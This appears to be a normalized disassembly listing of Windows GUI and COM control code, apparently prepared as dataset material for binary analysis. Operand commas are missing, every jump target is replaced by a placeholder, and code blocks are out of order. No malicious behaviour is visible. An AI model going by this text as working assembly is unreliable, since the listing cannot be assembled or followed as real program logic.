mov ecx [ eax ]
push eax
call [ ecx + 0x4c ]
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x1c ]
push edx
push esi
mov ecx [ eax ]
push eax
call [ ecx + 0x24 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x10 ]
inc esi
movzx eax [ eax + 0x30 ]
cmp esi eax
jb r-xdata
mov eax [ ebp - 0x1c ]
and eax 0x7
cmp al 0x3
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] edi
push edx
mov ecx [ eax ]
push esi
push eax
call [ ecx + 0x20 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x8 ]
push edx
push [ ebp - 0x20 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x38 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov esi [ ebp - 0x18 ]
mov edi [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
push [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x4c ]
sub_40b482
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x10
push 0x0
lea esi [ edi + 0x74 ]
push esi
call sub_410a20
mov edi [ edi + 0x4c ]
and [ ebp - 0x4 ] 0x0
add esp 0xc
lea ecx [ ebp - 0x4 ]
mov [ esi ] 0x10
mov eax [ edi ]
push ecx
push r--data
push edi
call [ eax ]
test eax eax
jl r-xdata
pop edi
pop esi
leave
retn
mov eax [ ebp - 0x4 ]
push esi
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_40b4d0
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
mov ax [ esi + 0x7c ]
cmp ax bx
je r-xdata
xor eax eax
cmp [ esi + 0x78 ] ebx
je r-xdata
movzx eax ax
push edi
lea eax [ eax + eax * 2 ]
shl eax 0x1
push eax
call sub_4221b9
mov edi eax
pop ecx
movzx eax [ esi + 0x7c ]
push eax
push edi
push [ esi + 0x78 ]
call [ CopyAcceleratorTableA@IAT ]
cmp eax ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
jle r-xdata
push edi
call sub_4221e2
mov eax [ ebp - 0x8 ]
pop ecx
pop edi
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov ecx edi
mov esi [ edx + 0x4 ]
pop esi
pop ebx
leave
retn 0x4
and [ ebp + 0x8 ] 0x0
mov [ ebp + 0x8 ] 0x10
jmp r-xdata
inc [ ebp - 0x4 ]
add ecx 0x6
cmp [ ebp - 0x4 ] eax
jl r-xdata
mov bx [ ecx + 0x2 ]
cmp bx [ edx + 0x8 ]
je r-xdata
movzx ebx [ ecx ]
and ebx 0xfffffffd
cmp ebx [ ebp + 0x8 ]
jne r-xdata
cmp esi 0x106
jne r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
sub_40b573
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
test [ esi + 0x71 ] 0x40
jne r-xdata
mov eax [ esi + 0x4c ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
pop esi
jl r-xdata
mov eax [ esi ]
call [ eax + 0xac ]
leave
retn 0x4
mov eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x10 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_40b5bb
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x4c ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
leave
retn 0x4
mov eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_40b5f1
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
mov esi ecx
lea edx [ ebp - 0x4 ]
push edx
mov eax [ esi + 0x50 ]
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
test eax eax
jl r-xdata
pop esi
leave
retn
mov eax [ ebp - 0x4 ]
cmp [ esi + 0x20 ] eax
je r-xdata
mov ecx [ esi + 0x24 ]
mov [ esi + 0x20 ] eax
test ecx ecx
je r-xdata
push eax
call sub_41f42c
mov eax [ esi + 0x24 ]
mov [ eax + 0x38 ] esi
sub_40b62e
push esi
mov esi ecx
mov ecx [ esi + 0x24 ]
and [ esi + 0x20 ] 0x0
test ecx ecx
je r-xdata
pop esi
retn
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ esi + 0x24 ]
and [ eax + 0x38 ] 0x0
mov eax [ ecx ]
push edi
call [ eax + 0x80 ]
mov edi eax
mov eax [ esi + 0x24 ]
push [ eax + 0x1c ]
call [ IsWindow@IAT ]
test eax eax
je r-xdata
mov ecx [ esi + 0x24 ]
call sub_41f465
pop edi
cmp [ edi ] 0x0
je r-xdata
mov ecx [ esi + 0x24 ]
call sub_42197e
sub_40b67c
push esi
mov esi ecx
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x1c ]
push 0x0
push [ esp + 0xc ]
mov ecx [ eax + 0x1c ]
push 0xfffffffe
mov eax [ ecx ]
push [ esi + 0x28 ]
call [ eax + 0xc ]
mov eax [ ecx ]
push 0x0
push [ esp + 0xc ]
push 0xfffffffe
push [ esi + 0x28 ]
call [ eax + 0xc ]
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
pop esi
retn 0x4
sub_40b6b9
push ebp
mov ebp esp
push ecx
cmp [ ecx + 0x58 ] 0x0
push esi
lea esi [ ecx + 0x58 ]
jne r-xdata
push [ ebp + 0x1c ]
mov ecx esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_429760
mov ecx [ ecx + 0x4c ]
test ecx ecx
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax [ ecx ]
lea edx [ ebp - 0x4 ]
push edx
push r--data
push ecx
call [ eax ]
test eax eax
jl r-xdata
pop esi
leave
retn 0x18
push 0x1
mov ecx esi
push [ ebp - 0x4 ]
call sub_42972d
sub_40b70f
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test ah 0x40
je r-xdata
push 0x8
pop edx
cmp ax dx
jne r-xdata
and eax 0xbfff
or al 0x40
test ah 0x80
je r-xdata
push 0xe
pop eax
xor edx edx
cmp ax 0x9
setne dl
dec edx
and edx 0x4
add edx 0x4
and eax 0x7fff
jmp r-xdata
push esi
push edi
push [ ebp + 0x10 ]
mov esi [ ecx ]
mov [ ebp + 0xe ] al
lea edi [ ebp + 0xe ]
xor eax eax
push edi
push eax
push eax
push edx
mov [ ebp + 0xf ] al
push [ ebp + 0x8 ]
call [ esi + 0x58 ]
pop edi
pop esi
pop ebp
retn 0xc
sub_40b76a
push ebp
mov ebp esp
lea edx [ ebp + 0x20 ]
mov ecx [ ebp + 0x8 ]
push edx
push [ ebp + 0x1c ]
mov eax [ ecx ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ eax + 0x58 ]
pop ebp
retn
sub_40b7bd
mov eax sub_42b0ac
call sub_410a78
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov eax [ ecx ]
lea edx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] esp
and [ ebp - 0x4 ] 0x0
push edx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ eax + 0x5c ]
mov [ ebp + 0x10 ] 0x1
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
sub_40b810
mov eax sub_42b0b8
call sub_410a78
sub esp 0x14
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push 0xfffffff0
push [ esi + 0x20 ]
mov [ ebp - 0x1c ] esi
call [ GetWindowLongA@IAT ]
and [ ebp - 0x4 ] 0x0
mov edi eax
mov eax [ esi ]
and edi 0x10000000
or edi [ esi + 0x6c ]
lea ecx [ ebp - 0x18 ]
push ecx
push 0xb
push 0xfffffdfe
mov ecx esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] 0x1
call [ eax + 0x64 ]
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov edx [ esi ]
and [ ebp - 0x18 ] 0x0
push 0x2
lea ecx [ ebp - 0x18 ]
pop eax
push ecx
push eax
push 0xfffffe08
mov ecx esi
mov [ ebp - 0x4 ] eax
call [ edx + 0x64 ]
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
or edi 0x8000000
mov [ ebp - 0x14 ] edi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or [ ebp - 0x12 ] 0x80
sub_40b87d
mov esi [ ebp - 0x1c ]
mov edx [ esi ]
and [ ebp - 0x18 ] 0x0
push 0x2
lea ecx [ ebp - 0x18 ]
pop eax
push ecx
push eax
push 0xfffffe08
mov ecx esi
mov [ ebp - 0x4 ] eax
call [ edx + 0x64 ]
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or [ ebp - 0x12 ] 0x80
sub_40b8c6
mov eax sub_42b0c4
call sub_410a78
sub esp 0x10
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push 0xffffffec
push [ esi + 0x20 ]
call [ GetWindowLongA@IAT ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
push ecx
push 0x2
push 0xfffffdf8
mov ecx esi
call [ eax + 0x64 ]
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or [ ebp - 0x13 ] 0x2
sub_40b92e
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov eax ebx
mov esi ecx
push edi
mov edi [ esp + 0x14 ]
not eax
and eax [ esi + 0x6c ]
or eax edi
and eax [ esi + 0x68 ]
mov [ esi + 0x6c ] eax
mov eax 0x8000000
test eax ebx
jne r-xdata
mov ecx [ esi ]
mov edx edi
not edx
and edx eax
push edx
push 0xb
push 0xfffffdfe
push esi
call [ ecx + 0x6c ]
add esp 0x10
test eax eax
je r-xdata
test eax edi
je r-xdata
mov eax 0x800000
test eax ebx
jne r-xdata
mov eax 0xf7ffffff
and ebx eax
and edi eax
mov ecx [ esi ]
mov edx edi
and edx eax
push edx
push 0x2
push 0xfffffe08
push esi
call [ ecx + 0x6c ]
add esp 0x10
test eax eax
je r-xdata
test eax edi
je r-xdata
push [ esp + 0x18 ]
push edi
push ebx
push [ esi + 0x20 ]
call sub_41f07f
pop edi
pop esi
pop ebx
retn 0xc
mov eax 0xff7fffff
and ebx eax
and edi eax
sub_40b9be
push ebp
mov ebp esp
mov eax 0x200
push esi
test [ ebp + 0x8 ] eax
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
jne r-xdata
mov ecx [ esi ]
mov edx edi
and edx eax
push edx
push 0x2
push 0xfffffdf8
push esi
call [ ecx + 0x6c ]
add esp 0x10
test eax eax
je r-xdata
test eax edi
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
push [ esi + 0x20 ]
call sub_41f099
pop edi
pop esi
pop ebp
retn 0xc
mov eax 0xfffffdff
and [ ebp + 0x8 ] eax
and edi eax
sub_40ba0e
push esi
mov esi ecx
push [ esp + 0x8 ]
mov eax [ esi ]
push 0x8
push 0xfffffdfa
push esi
call [ eax + 0x6c ]
add esp 0x10
test eax eax
jne r-xdata
pop esi
retn 0x4
push [ esp + 0x8 ]
mov eax [ esi ]
push 0x8
push 0xfffffdfb
push esi
call [ eax + 0x6c ]
add esp 0x10
sub_40ba41
mov eax sub_42b0d0
call sub_410a78
sub esp 0xc
push ebx
mov eax [ ecx ]
push esi
push edi
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] esp
push [ ebp + 0x8 ]
mov [ ebp - 0x14 ] ecx
push 0x8
push 0xfffffdfa
call [ eax + 0x64 ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_40bab0
mov eax sub_42b0e4
call sub_410a78
push ecx
mov eax [ rw-data ]
push esi
mov [ ebp - 0x10 ] eax
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
push edx
call [ eax + 0x88 ]
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call [ lstrcpynA@IAT ]
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
mov esi eax
call sub_422478
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
sub_40bb0b
mov eax sub_42b0f8
call sub_410a78
push ecx
mov eax [ rw-data ]
push esi
mov [ ebp - 0x10 ] eax
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
push edx
call [ eax + 0x88 ]
mov eax [ ebp - 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
mov esi [ eax - 0x8 ]
call sub_422478
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_40bb5d
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
lea ebx [ ecx + 0x2c ]
push edi
mov esi ebx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] ecx
movsd [ edi ] [ esi ]
mov ecx [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
mov edi [ ebp + 0xc ]
mov esi [ SetRect@IAT ]
add eax edi
push eax
mov eax [ ebp + 0x8 ]
add ecx eax
push ecx
push edi
push eax
push ebx
call esi
mov ecx [ ebp - 0x4 ]
call sub_40a8ed
test eax eax
je r-xdata
lea esi [ ebp - 0x14 ]
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
add eax edi
push eax
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
add eax [ ebp + 0x8 ]
push eax
push edi
push [ ebp + 0x8 ]
push ebx
call esi
mov eax [ ebp - 0x4 ]
push ebx
push ebx
mov eax [ eax + 0x50 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x14
sub_40bbd7
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov esi ecx
test bl 0x80
je r-xdata
mov eax ebx
and eax 0x3
cmp al 0x3
je r-xdata
mov eax [ esi ]
push 0x0
call [ eax + 0xa0 ]
test bl 0x40
je r-xdata
test bl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
and bl 0x3f
or ebx 0x3
test eax eax
je r-xdata
mov eax [ esi ]
push 0x5
mov ecx esi
call [ eax + 0xa0 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov eax [ esi + 0x2c ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x30 ]
jmp r-xdata
push ebx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ esi + 0x20 ]
call [ SetWindowPos@IAT ]
pop esi
pop ebx
leave
retn 0x18
mov eax [ eax + 0x1c ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x18 ]
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x38 ]
sub eax [ esi + 0x2c ]
sub ecx [ esi + 0x30 ]
jmp r-xdata
test bl 0x1
mov [ ebp + 0x1c ] eax
je r-xdata
push edi
mov edi ebx
not edi
shr edi 0x3
and edi 0x1
mov edx [ esi ]
push edi
push ecx
push eax
mov ecx esi
push [ ebp + 0x1c ]
push [ ebp - 0x4 ]
call [ edx + 0x98 ]
pop edi
sub_40bc8c
push esi
mov esi ecx
push edi
push [ esi + 0x20 ]
call [ IsWindowVisible@IAT ]
mov edi eax
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push 0xfffffffd
pop eax
cmp eax 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x3
jle r-xdata
mov edx [ esi ]
push 0x0
push eax
mov ecx esi
call [ edx + 0x54 ]
mov eax edi
pop edi
pop esi
retn 0x4
cmp eax 0x5
jg r-xdata
sub_40bccb
mov eax sub_42b104
call sub_410a78
sub esp 0xc
mov eax [ ecx ]
push ebx
and [ ebp - 0x4 ] 0x0
push esi
push edi
lea edx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] esp
push edx
push 0xb
push 0xfffffdfe
mov [ ebp - 0x14 ] 0x1
call [ eax + 0x64 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
sub_40bd19
mov eax sub_42b110
call sub_410a78
sub esp 0xc
push ebx
push esi
and [ ebp - 0x4 ] 0x0
mov esi ecx
push edi
lea ecx [ ebp - 0x14 ]
mov eax [ esi ]
mov [ ebp - 0x10 ] esp
push ecx
mov edi 0xfffffdfe
push 0xb
push edi
mov ecx esi
call [ eax + 0x64 ]
push [ ebp + 0x8 ]
mov eax [ esi ]
push 0xb
push edi
push esi
call [ eax + 0x68 ]
add esp 0x10
mov ecx [ ebp - 0xc ]
xor eax eax
cmp [ ebp - 0x14 ] eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
sete al
pop ebx
leave
retn 0x4
sub_40bd82
push esi
mov esi ecx
test [ esi + 0x71 ] 0x40
je r-xdata
push edi
call [ GetFocus@IAT ]
push eax
call sub_41f3e7
mov edi eax
mov eax [ esi ]
push 0x0
push 0xfffffffc
mov ecx esi
call [ eax + 0x54 ]
mov eax edi
pop edi
pop esi
retn
push [ esi + 0x20 ]
call [ SetFocus@IAT ]
push eax
call sub_41f3e7
pop esi
retn
sub_40bdbb
mov eax sub_42b126
call sub_410a78
push ecx
push esi
mov esi ecx
cmp [ esi + 0x88 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push 0x5c
call sub_4221b9
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push esi
call sub_40c61a
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx eax
mov [ esi + 0x88 ] eax
call sub_40c9a3
sub_40be0f
push esi
mov esi ecx
push edi
mov eax [ esi + 0x90 ]
test eax eax
je r-xdata
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
mov ecx [ eax + 0x88 ]
push 0x0
push esi
mov eax [ ecx ]
call [ eax + 0x8 ]
mov eax [ esi + 0x90 ]
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax + 0xc ]
and [ esi + 0x90 ] 0x0
pop edi
pop esi
retn 0x10
mov ecx [ edi + 0x38 ]
mov eax [ ecx ]
call [ eax + 0xb0 ]
mov eax [ edi + 0x38 ]
push [ esp + 0x14 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0x10 ]
mov [ esi + 0x94 ] eax
lea ecx [ esi + 0x9c ]
movzx eax [ esp + 0x14 ]
mov [ esi + 0x98 ] eax
call sub_422601
mov eax [ esi + 0x90 ]
push 0x1
push esi
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov esi [ esi + 0x90 ]
test esi esi
je r-xdata
mov ecx [ esi + 0x88 ]
mov eax [ ecx ]
call [ eax + 0xc ]
sub_40beb1
mov eax sub_42b13a
call sub_410a78
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov esi ecx
cmp edi ebx
je r-xdata
mov edi [ esi + 0x8c ]
mov [ ebp - 0x10 ] ebx
cmp edi ebx
je r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov ecx edi
call sub_40ecea
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
je r-xdata
push 0x1c
call sub_4221b9
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
cmp ecx ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ edi + 0x8 ] eax
jne r-xdata
xor eax eax
push ebx
push [ ebp + 0x8 ]
push [ esi + 0x8c ]
call sub_40eca7
jmp r-xdata
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov eax [ eax + 0x38 ]
cmp eax [ edi + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x10 ]
test ecx ecx
je r-xdata
mov [ esi + 0x8c ] eax
mov ecx [ edi + 0x38 ]
mov [ eax + 0xc ] ecx
mov eax [ esi + 0x8c ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax ] esi
mov eax [ esi + 0x8c ]
mov ecx [ eax + 0xc ]
mov eax [ ecx ]
call [ eax + 0xb0 ]
mov esi [ esi + 0x8c ]
push 0x1
push esi
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
jmp r-xdata
mov [ esi + 0x8c ] ebx
mov [ eax + 0x18 ] ebx
jmp r-xdata
test ebx ebx
mov edi ebx
jne r-xdata
call sub_40ecea
mov [ ebp - 0x10 ] eax
test edi edi
je r-xdata
mov ecx [ eax + 0x88 ]
test ecx ecx
je r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
push edi
call sub_4221e2
pop ecx
mov eax [ ecx ]
push 0x0
push edi
call [ eax + 0x4 ]
sub_40c07c
mov eax [ esp + 0x4 ]
mov eax [ eax - 0xa0 ]
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
neg eax
sbb eax eax
and eax 0x7fffbffb
add eax 0x80004005
retn 0x8
mov eax [ eax + 0x1c ]
sub_40c0c3
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
mov ecx [ edi - 0xa0 ]
lea esi [ edi - 0xa0 ]
push r--data
call sub_4284c7
test eax eax
jge r-xdata
and [ eax ] 0x0
mov eax [ esi ]
add edi 0xffffff70
push edi
push [ ebp + 0x14 ]
mov esi [ eax + 0x1c ]
call [ CopyRect@IAT ]
push [ ebp + 0x18 ]
push [ esi + 0x1c ]
call [ GetClientRect@IAT ]
mov eax [ ebp + 0x1c ]
and [ eax + 0x4 ] 0x0
test esi esi
je r-xdata
mov eax 0x80004005
jmp r-xdata
and [ eax + 0xc ] 0x0
and [ eax + 0x10 ] 0x0
mov [ eax + 0x8 ] esi
xor eax eax
mov esi [ esi + 0x1c ]
pop edi
pop esi
pop ebp
retn 0x18
sub_40c17e
push ebp
mov ebp esp
sub esp 0x20
push ebx
mov ebx [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x20 ]
push edi
push eax
mov eax [ ebx - 0xa0 ]
mov eax [ eax + 0x1c ]
push [ eax + 0x1c ]
call [ GetClientRect@IAT ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call [ CopyRect@IAT ]
lea eax [ ebx - 0x90 ]
lea esi [ ebp - 0x10 ]
mov edi eax
mov ebx [ ebx - 0x6c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
mov ecx [ ebx ]
push edx
push eax
push ebx
call [ ecx + 0x1c ]
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_40c224
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push [ eax - 0xa0 ]
xor esi esi
mov [ ebp - 0x4 ] esi
call [ GetDC@IAT ]
mov edi eax
push 0x3
push edi
call [ SetMapMode@IAT ]
mov bl [ ebp + 0x14 ]
mov [ ebp - 0x14 ] esi
test bl 0x4
mov [ ebp - 0x10 ] esi
je r-xdata
test bl 0x8
je r-xdata
mov eax [ ebp + 0xc ]
push 0x2
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push edi
mov [ ebp - 0xc ] ecx
call [ LPtoDP@IAT ]
test bl 0x2
je r-xdata
mov [ ebp - 0x4 ] 0x80070057
mov esi [ ebp + 0x10 ]
fld [ esi ]
call sub_412424
fld [ esi + 0x4 ]
mov [ ebp - 0xc ] eax
call sub_412424
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push 0x2
push eax
push edi
call [ DPtoLP@IAT ]
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
sub eax [ ebp - 0x14 ]
sub ecx [ ebp - 0x8 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp + 0x10 ]
fild [ ebp + 0xc ]
mov [ ebp + 0x10 ] ecx
fstp [ eax ]
fild [ ebp + 0x10 ]
jmp r-xdata
test bl 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0xc ]
sub ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0x8 ]
jmp r-xdata
fild [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
fstp [ eax ]
fild [ ebp - 0x8 ]
fstp [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push edi
push [ eax - 0xa0 ]
call [ ReleaseDC@IAT ]
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn 0x10
sub_40c375
mov eax [ esp + 0x4 ]
push [ esp + 0x1c ]
add eax 0xffffff3c
push [ esp + 0xc ]
mov ecx [ eax + 0x1c ]
push eax
mov ecx [ ecx + 0x1c ]
mov edx [ ecx ]
call [ edx + 0x94 ]
neg eax
sbb eax eax
and eax 0x7ffdfffd
add eax 0x80020003
retn 0x24
sub_40c3a6
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_410ae0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push eax
mov [ ecx ] eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_410ae0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
retn 0xc
sub_40c3f6
push ebp
mov ebp esp
sub esp 0x38
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
lea edi [ eax - 0xc8 ]
xor esi esi
cmp [ edi + 0xa0 ] esi
jne r-xdata
xor eax eax
cmp [ edi + 0x88 ] esi
mov ebx [ ebp + 0xc ]
jne r-xdata
cmp [ edi + 0x94 ] ebx
jne r-xdata
lea eax [ ebp - 0x38 ]
mov ecx edi
push eax
mov [ ebp - 0x38 ] 0x2
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] esi
call sub_40b67c
mov eax [ ebp - 0x20 ]
cmp eax esi
jne r-xdata
lea eax [ edi + 0xa8 ]
push eax
call [ VariantClear@IAT ]
mov eax [ edi + 0x4c ]
lea edx [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esi
push edx
mov ecx [ eax ]
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
push 0x20
